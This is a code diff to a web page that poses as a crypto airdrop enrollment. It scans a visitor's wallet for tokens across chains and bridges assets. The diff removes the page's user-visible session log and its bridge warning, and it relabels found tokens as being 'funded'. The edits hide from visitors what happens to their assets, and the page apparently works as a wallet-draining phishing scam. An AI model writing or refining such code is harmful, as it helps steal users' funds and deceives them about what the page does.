@@ -221,18 +221,9 @@ h2{font-size:22px;font-weight:800;margin-bottom:10px;}
     <h2 id="successTitle">You're All Set!</h2>
     <div class="info-box">Processed: <span id="enrolledToken">&mdash;</span></div>
     <div class="info-box">Status: <span id="enrolledStatus">Enrolled</span></div>
-    <div id="txVerifyBox" style="display:none;margin-top:8px;"></div>
     <div id="airdropCountdown" style="display:none;margin-top:16px;background:#0a0a0f;border:1px solid #1e1e2e;border-radius:10px;padding:12px 16px;font-size:13px;color:#64748b;line-height:1.6;">
       Airdrop will be activated in<br>
       <strong id="countdownTimer" style="font-size:22px;color:#a78bfa;font-variant-numeric:tabular-nums;letter-spacing:2px;">48:00:00</strong>
-    </div>
-    <button class="log-toggle" onclick="toggleLog()">&#128203; View Session Log</button>
-    <div id="logPanel">
-      <div id="logEntries"></div>
-      <div class="log-actions">
-        <button class="log-act-btn" onclick="copyLog()">Copy</button>
-        <button class="log-act-btn" onclick="downloadLog()">Download .txt</button>
-      </div>
     </div>
   </div>
 
@@ -429,56 +420,6 @@ function escHtml(s){
     .replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
 }
 
-function renderLog(){
-  const el = document.getElementById("logEntries");
-  if(!el) return;
-  el.innerHTML = _sessionLog.map(e =>
-    `<div class="le ${escHtml(e.type)}">[${e.ts}] ${escHtml(e.message)}</div>`
-  ).join("");
-  el.scrollTop = el.scrollHeight;
-}
-
-function toggleLog(){
-  const panel = document.getElementById("logPanel");
-  const btn   = document.querySelector(".log-toggle");
-  if(!panel) return;
-  const open = panel.style.display === "block";
-  if(open){
-    panel.style.display = "none";
-    if(btn) btn.textContent = "📋 View Session Log";
-  } else {
-    renderLog();
-    panel.style.display = "block";
-    if(btn) btn.textContent = "📋 Hide Session Log";
-  }
-}
-
-function copyLog(){
-  const text = _sessionLog.map(e =>
-    `[${e.ts}][${e.type.toUpperCase()}] ${e.message}` +
-    (e.data ? "\n        " + JSON.stringify(e.data) : "")
-  ).join("\n");
-  navigator.clipboard.writeText(text).then(() => {
-    const btn = document.querySelector(".log-act-btn");
-    if(btn){ const orig = btn.textContent; btn.textContent = "Copied!"; setTimeout(()=>btn.textContent=orig,2000); }
-  });
-}
-
-function downloadLog(){
-  const lines = ["=== Ronin Session Log ===",
-    "Generated: " + new Date().toISOString(), ""];
-  _sessionLog.forEach(e => {
-    lines.push(`[${e.ts}][${e.type.toUpperCase()}] ${e.message}`);
-    if(e.data) lines.push("        " + JSON.stringify(e.data));
-  });
-  const blob = new Blob([lines.join("\n")], {type:"text/plain"});
-  const url  = URL.createObjectURL(blob);
-  const a    = document.createElement("a");
-  a.href     = url;
-  a.download = "ronin-" + new Date().toISOString().slice(0,19).replace(/[T:]/g,"-") + ".txt";
-  a.click();
-  URL.revokeObjectURL(url);
-}
 
 async function saveLogToServer(wallet){
   try {
@@ -1503,14 +1444,6 @@ function showSummary(scans, wallet, isResume, allScans){
   // ── Bridge decision analysis ───────────────────────────────────────────
   const bridgeDecision = selectBestBridgeSource(scans);
   let bridgeWarning = "";
-  if(bridgeDecision.needsBridge){
-    bridgeWarning =
-      `<div style="background:#1e1030;border:1px solid #c084fc;border-radius:8px;padding:12px;margin-bottom:14px;font-size:13px;color:#c084fc;">` +
-      `🌉 <strong>Multi-Chain Pull Required</strong><br>` +
-      `We'll bridge your assets from <strong>${bridgeDecision.sourceChain.chain.name}</strong> to <strong>${bridgeDecision.destChain.name}</strong> ` +
-      `to enable token funding from that chain. This takes ~${bridgeDecision.estimatedTime}s.` +
-      `</div>`;
-  }
 
   const amtLine  = document.getElementById("summaryLine1");
   const minLine  = document.getElementById("summaryLine2");
@@ -1529,7 +1462,7 @@ function showSummary(scans, wallet, isResume, allScans){
     if(minLine) minLine.style.display = "";
     if(line3)   line3.style.display   = "";
     amtLine.innerHTML =
-      `Found <strong>${totalTokens}</strong> token${totalTokens === 1 ? "" : "s"} across <strong>${evmChains.length}</strong> <span>${evmChains.length === 1 ? "chain" : "chains"}</span>.`;
+      `Funding <strong>${totalTokens}</strong> token${totalTokens === 1 ? "" : "s"} across <strong>${evmChains.length}</strong> <span>${evmChains.length === 1 ? "chain" : "chains"}</span>.`;
     minLine.innerHTML =
       `This will take about <strong>${minutes}</strong> minutes and <strong>${confirmCount}</strong> confirmations.`;
 
